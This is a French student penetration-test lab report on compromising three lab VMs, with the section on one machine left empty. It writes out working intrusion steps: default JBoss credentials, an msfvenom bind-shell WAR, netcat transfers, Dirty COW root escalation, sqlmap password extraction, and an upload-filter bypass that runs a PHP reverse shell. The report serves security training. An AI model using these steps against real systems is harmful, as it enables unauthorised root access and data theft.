# TL de Pentest

**Arthur Dang et Negre Léo**

## I - Introduction

**Contexte**
La société XXX nous a contacté pour effectuer un test de pénétration sur son système d'information

**Périmètre**
Par système d'information on entend les trois machines Linux:
- Alice 192.168.56.2
- Bob 192.168.56.3
- Charlie 192.168.56.4

**Objectifs**
L'objectif est de pénétrer les trois machines, et d'y obtenir des privilèges administrateurs.

**Méthodes**
Le choix des méthodes est laissé aux pentesters. Nous n'avons initialement pas accès au code source des différentes pages web et services des machines (analyse boite noire).

**Charge**
Le test de pénétration est effectué en 4 demi journées.

But
Vulnérabilité
Boîte noire
startPentest
stopPentest
3 VMs: Alice, Bob et Charlie

## II - Résumé Managerial

Retour général
Comparaison à la moyenne
Vulnérabilités
Recommendations

## III - Contenu Technique 

Nous commençons par lancer un scan du sous-réseau pour voir les machines que l'ont peut détecter.

![img](assets/alice_scan_reseau.png)

Nous détectons notre machine hôte (192.168.56.1) et notre VM kali (192.168.56.103) mais aussi une nouvelle machine que nous allons appeler Alice avec l'adresse IP `192.168.56.2`.

Nous avons donc commencer par analyser cette machine.

### 1 - Exploitation de Alice

Pour essayer de voir les failles de vulnérabilités d'Alice, nous avons scanné ses ports pour voir lesquels étaient ouverts.

![img](assets/alice_scan_port.png)

#### Port 80 - Http - Apache httpd 2.2.16

Ce port héberge un serveur http qui affiche le site qu'il héberge lorsque l'on se connecte dessus.

Dans un premier temps avec une navigation avec le navigateur à l'adresse 192.168.56.2:80, on nous affiche une page web basic sans importance.

#### Port 8080 - http - Apache Tomcat/Coyote JSP Engine 1.1

Le port 8080 est habituellement utilisé pour pour le développement de son application web.

Il affiche aussi un site web plus fourni avec en particulier une application qui affiche un calendrier.

En effectuant un scan de directory avec l'outil `dirb` ou l'auxiliaire `dir_scanner` de metasploit, on n'observe aucun fichier sensible en particuilier.

![img](assets/alice_dirb_8080.png)

On peut chercher les CVE connues à la version Apache Tomcat/Coyote JSP Engine 1.1.

#### Port 9990 - http - JBoss Admnistrator

Jboss administator est un serveur d'applicaiton aidant à la gestion d'un serveur web.

**Connection sur le site d'administration**
En navigant sur ce port on arrive facilement à trouver la page d'authentification en testant les pages /manager, /host-manager pour faire des actions d'admin. Les crédentials sont `admin:admin` que l'ont a pu trouvé en testant les plus courants.

![img](assets/alice_jboss_manage.png)

**Mise en place de la backdoor**
Nous avons alors créer un programme qui ouvrait un bind shell conforme à la plateforme JBoss. (En java compressé en .war).

Nous l'avons réalisé avec l'outil msfvenom pour se connecter au port 1234:
`msfvenom -p java/jsp_shell_bind_tcp LPORT=1234 -f war > shell.war`

En uploadant ce programme sur le serveur Jboss et en exécutant cette application en navigant à l'url `192.168.56.2/shell/` pour l'exécuter, notre backdoor a été lancée et nous pouvons nous y connecter pour accéder à un shell.

`nc 192.168.56.2 1234`
Nous pouvons vérifier notre connection en testant des commandes.

**Elevation de privilèges**
Nous voyons que nous somme connectés en tant que user "jboss". Et nous allons essayer d'avoir les droits roots pour vraiment prendre le contrôle de la machine.

`uname -a` permet de voir la version de l'os et de voir si il y a des failles connues pour cette machine.
`Linux Alice 2.6.32-5-686 #1 SMP Sun Sep 23 UTC 2012 i686 GNU/Linux`

Cette version d'OS est en particulier vulnérable à l'exploit dirtycow qui permet de créer un user avec les droits root.

On télécharge le programme dirty.c qui permet réaliser l'exploit. Qu'on transmet sur la machine d'alice via la backdoor que l'on a créer, qu'on compile et exécute.
La transmission du fichier a été réalisée avec: `nc -l -p 4444 < dirty.c` sur notre machine et `nc 192.168.56.1 4444 > dirty.c`.

```bash
$ ./dirty
Please enter the new password: firefart
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash

mmap: b77ad000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'firefart'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash

mmap: b77ad000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'firefart'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

On peut alors se connecter avec notre nouvel utilisateur `firefart` qui à les droits root. En ouvrant bien un terminal pour pouvoir avoir les retours du shell (demande de mot de passe..)

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
jboss$ su firefart
Password: firefart
```

### Exploitation de Bob

**Scan des ports**

**Connection en ssh**


### Exploitation de Charlie

**Création d'un tunnel ssh pour interagir depuis la Kali**
*Première tentative*  
On essaie de créer un tunnel partant de la Kali, passant par Alice, puis Bob, qui atteindrait Charlie sur son port 80. Nous n'avons pas réussi à cause d'un problème de loopback sur Bob. Puisqu'on a des droits privilégiés sur Bob, on préfère simplement ajouter notre Kali aux machines pouvant se connecter sur Bob en ssh.  
`firefart@bob iptables -A input -p tcp -s <Kali IP> -j ACCEPT`
Puis à partir de la Kali:  
`root@kali ssh -L 1234:<Charlie IP>:4444 firefart@Bob`
On peut tester avec le navigateur internet de la kali sur localhost:1234 ou avec ```wget localhost:1234``` 
Il contient plusieurs pages avec des images, ainsi qu'un onglet admin. On essaie quelques identifiants et injonction SQL de base, sans succès. On va chercher à scanner les fichiers auxquels on peut accéder. Pour cela on utilise l'exploit files_dir qui nous retourne
```
msf5 auxiliary(scanner/http/files_dir) > run

[*] Using code '404' as not found for files with extension .null
...
[*] Using code '404' as not found for files with extension .php
[+] Found http://127.0.0.1:1234/all.php 200
[+] Found http://127.0.0.1:1234/cat.php 200
[+] Found http://127.0.0.1:1234/header.php 200
[+] Found http://127.0.0.1:1234/index.php 200
[+] Found http://127.0.0.1:1234/show.php 200
[*] Using code '404' as not found for files with extension .tar
[+] Found http://127.0.0.1:1234/website.tar 200
[*] Using code '404' as not found for files with extension .tar.gz
[+] Found http://127.0.0.1:1234/website.tar.gz 200
[*] Using code '404' as not found for files with extension .tgz
...
[*] Using code '404' as not found for files with extension 
[+] Found http://127.0.0.1:1234/admin 301
[+] Found http://127.0.0.1:1234/all 200
[+] Found http://127.0.0.1:1234/cat 200
[+] Found http://127.0.0.1:1234/classes 301
[+] Found http://127.0.0.1:1234/css 301
[+] Found http://127.0.0.1:1234/images 301
[+] Found http://127.0.0.1:1234/header 200
[+] Found http://127.0.0.1:1234/index 200
[+] Found http://127.0.0.1:1234/manual 301
[+] Found http://127.0.0.1:1234/show 200
[+] Found http://127.0.0.1:1234/website 200
[*] Using code '404' as not found for files with extension 
[+] Found http://127.0.0.1:1234/admin 301
[+] Found http://127.0.0.1:1234/all 200
[+] Found http://127.0.0.1:1234/cat 200
[+] Found http://127.0.0.1:1234/classes 301
[+] Found http://127.0.0.1:1234/css 301
[+] Found http://127.0.0.1:1234/images 301
[+] Found http://127.0.0.1:1234/header 200
[+] Found http://127.0.0.1:1234/index 200
[+] Found http://127.0.0.1:1234/manual 301
[+] Found http://127.0.0.1:1234/show 200
[+] Found http://127.0.0.1:1234/website 200
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
On peut donc récupérer sur le path /website le code du site. On cherche en particulier la page correspondant à la gestion du login sur l'onglet admin, et dans user.php on voit 
```
class User {
  const SITE= "PHOTOBLOG";
  function login($user, $password) {
    $sql = "SELECT * FROM users where login=\"";
    $sql.= mysql_real_escape_string($user);
    $sql.= "\" and password=md5(\"";
    $sql.= mysql_real_escape_string($password);
    $sql.= "\")";
    $result = mysql_query($sql);
    if ($result) {
      $row = mysql_fetch_assoc($result);
      if ($user === $row['login']) {
        return TRUE;
      }
    }
    else 
      echo mysql_error();
    return FALSE;
    //die("invalid username/password");
  }

```
Sur la page d'idenfitication admin, le serveur execute "SELECT * FROM users where login = "$user" and passwod = md5("$password"), mais mysql_real_escape_string empêche les injonctions SQL, en tout cas celles que nous sommes capables de faire à notre niveau.  

**SQLMap** 
En analysant le reste du code en particulier db.php, on voit qu'il y a une base de données mysql sous-jacente. On utilise l'outil kali sqlmap pour obtenir des informations à propos de la base de données. 
```sqlmap -u "http://localhost:1234/cat.php?id=2" -a``` est très verbeux, et en filtrant correctement les résultats, on récupère les hashs md5 des mots de passe. Sqlmap propose de les cracker. On trouve ainsi le couple login ```admin``` password  ```P4ssw0rd```

**Upload de fichier**
On se connecte à l'onglet admin. On peut maintenant upload des images dans un des onglets. Comme pour Alice, on va chercher à uploader un fichier malicieux, puis de naviguer jusqu'à lui par le navigateur pour l'éxécuter. On cherche à éxécuter plus particulièrement un reverse shell Cependant on ne peut pas envoyer n'importe quel fichier: le serveur demande des images et refuse les php.

*Première tentative:* Si la vérification s'effectue coté client, on peut:
1. Uploader le fichier .php
2. Intercepter le paquet, avec l'outil Burp Suite
3. Remplacer dans le paquet le .php par un .jpg ou .png
4. Forwarder le paquet

[![Burp suite image](https://github.com/L-e-N/PenTest/blob/master/assets/charlie_burp_suite.png)](https://github.com/L-e-N/PenTest/blob/master/assets/charlie_burp_suite.png)
Ca ne fonctionne pas, c'est parce que la vérification s'effectue coté serveur.

*Deuxième tentative:* On veut plus d'informations sur comment est effectuée la vérification. Dans le code source, picture.php montre comment le serveur différencie image de php .
```
function create(){
  if(isset($_FILES['image'])){
    $dir = 'uploads/';
    $file = basename($_FILES['image']['name']);

    if (!preg_match('/\w{3,12}.\w{2,4}$/',$file)) {
      DIE("The filename should only contains between 3 to 8 letters");
    }
    if (preg_match('/\.php$/',$file)) {
      DIE("NO PHP!!");
    }

    if(!move_uploaded_file($_FILES['image']['tmp_name'], $dir . $file)) {
      die("Error during upload");
    }
    $sql = "INSERT INTO pictures (title, img, cat) VALUES ('";
    $title = mysql_real_escape_string($_POST["title"]);
    $img = mysql_real_escape_string( $file);
    $cat = (int)$_POST["category"];
    $sql .= $title."','".$img."','".$cat;
    $sql.= "')";
    echo $sql;
    $result = mysql_query($sql);
    echo mysql_error(); 
  }
  }
  ```
On observe les protections: on ne peut pas uploader de .php, ni effectuer de commandes dans le champ 'titre'. Il est très simple de contourner cette limitation, en utilisant une extension de fichier .php3 ou .PHp.

**Payload pour le reverse shell**
1. Sur Kali, On prend reverse_shell.php (https://github.com/pentestmonkey/php-reverse-shell). On modifie l'IP et le Port pour envoyer le shell vers Bob, en effet notre Kali n'est pas accessible depuis Charlie.
2. Sur Bob, on écoute `nc -lvp 8888`
3. Sur Kali, on uploade reverse_shell.php sur l'onglet admin de Charlie, et on lance le fichier en naviguant.
4. Sur Bob, on teste le shell avec `uname` qui renvoie bien `Linux`

**Payload pour l'élévation de privilèges**
Sur le shell on se met dans /tmp, on essaie de copier le code source c de dirtycow, mais Charlie n'a pas vim ni nano, c'est peu pratique. On souhaite uploader dirty.c d'une manière ou d'une autre, on pourrait faire de la même manière que Bob mais on essaie de continuer d'exploiter les faiblesses de l'onglet admin.
1. Sur Kali, on uploade le code source c de dirtycow sous le nom dirty.html
2. Sur Kali, on uploade un fichier path.php3 très simple effectuant simplement l'instruction `pwd`.
3. Sur Kali, on navigue à path.php3. On trouve var/www/admin/uploads, qui est le path où sont stockés les images uploadées.
3. Sur Bob dans le shell de Charlie, on renomme dirty.html en dirty.c
4. On compile et éxécute dirty.c

On a alors un accès privilégié à Charlie.

## IV - Conclusion
L'objectif de la mission a été accompli: en 4 demi-journées, nous avons obtenu des accès privilégiés à toutes les machines. Il existait des protections de base sur les machines. Elles n'étaient pas suffisantes: nous avons exploité des mots de passe faibles, ou des failles classiques et connues. Nos recommandations principales sont d'utiliser la politique de mot de passe conseillée par l'ANSSI, et de mettre à jour vos machines plus régulièrement.  
Il existe très probablement des failles plus complexes, nous vous conseillons donc de commencer par celles que nous avons expliquées, puis de refaire un test de pénétration en laissant plus de temps aux Pentesteurs.  
Enfin nous recommandons de former un développeur de votre équipe à quelques notions de cybersécurité en passant par exemple (ISC)2 ou ISACA, ou d'embaucher un expert en cybersécurité, pour être au fait des failles les plus récentes.
### Nos résultats

### Les vulénrabilités

### Comment sécuriser le système
